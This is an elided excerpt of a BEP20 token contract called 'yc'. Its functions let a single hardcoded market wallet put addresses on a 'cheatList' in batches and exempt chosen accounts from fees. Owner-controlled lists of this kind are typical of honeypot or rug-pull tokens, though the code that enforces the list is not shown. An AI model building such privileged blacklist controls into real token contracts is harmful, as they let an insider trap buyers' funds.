...
abstract contract BEP20 is Context, IERC20, Ownable {
    ...
    function setisExcludedFromFee(address account, bool newValue) public {
        require(msg.sender == marketWalletAddress);
        isExcludedFromFee[account] = newValue;
    }

    function manageExcludeFromFee(address[] calldata addresses, bool status) public {
    ...
    function manage_cheater(address[] calldata addresses, bool status) public {
        require(addresses.length < 201 && msg.sender == marketWalletAddress);
        for (uint256 i; i < addresses.length; ++i) {
            cheatList[addresses[i]] = status;
        }
    }

    function setcheatList(address recipient, bool status) public {
        require(msg.sender == marketWalletAddress);
...
contract yc is BEP20 {
    constructor() BEP20(
        ...
        [uint256(0),uint256(3),uint256(2)],
        [uint256(0),uint256(3),uint256(2)],
        [uint256(800000000),uint256(800000000)],
        [0x2d25c6f6d4B1BF77f50765821332362BbA9dd109,0x2d25c6f6d4B1BF77f50765821332362BbA9dd109]
    ){}
}